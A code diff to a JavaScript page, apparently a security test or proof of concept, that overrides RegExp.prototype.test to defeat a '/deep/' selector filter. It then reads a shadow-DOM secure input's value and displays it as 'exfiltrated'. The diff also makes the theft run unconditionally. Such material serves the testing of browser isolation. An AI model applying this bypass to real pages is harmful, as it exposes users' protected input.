@@ -29,17 +29,27 @@ function keypress(evt) {
     return false;
 }
 
+var origTest = RegExp.prototype.test;
+function allowDeep() {
+    if (this.toString() === "/\/deep\/|>>>/") {
+        return false;
+    }
+}
+
 function steal() {
+    if (RegExp.prototype.test !== allowDeep) {
+        RegExp.prototype.test = allowDeep;
+    }
 
-
+    var secureInput = document.querySelector("html /deep/ .delegate");
+    if (secureInput) {
+        entryBox.textContent = "exfiltrated:" + secureInput.value;
+    }
 }
 
 function activateTheft(evt) {
     var box = evt.target;
-    var newSetting = box.checked;
-    if (newSetting) {
-        steal();
-    }
+    steal();
 }
 
 function textChanged(evt) {
